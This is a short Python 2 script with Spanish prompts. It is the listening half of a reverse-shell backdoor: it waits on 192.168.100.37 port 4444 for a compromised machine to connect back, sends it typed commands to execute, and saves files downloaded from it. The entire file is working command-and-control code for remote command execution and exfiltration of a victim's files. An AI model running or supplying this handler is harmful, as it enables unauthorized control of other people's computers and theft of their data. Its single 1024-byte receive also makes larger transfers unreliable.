import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listener.bind((ip, port))
        listener.listen(0)


        print("[+] Esperando por conexiones")

        self.connection, addres = listener.accept()

        print("[+] Tenemos una conexion de " + str(addres))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data)

    def escribir_archivo(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Descarga completa"


    def ejecutar_remoto(self, command):
        self.reliable_send(command)
        if command[0] == "salir":
            self.connection.close()
            exit()

        return self.reliable_recieve()



    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            result = self.ejecutar_remoto(command)

            if command[0] == "descargar":
                resultado = self.escribir_archivo(command[1], result)

            print(result)

escuchar = Listener("192.168.100.37", 4444)
escuchar.run()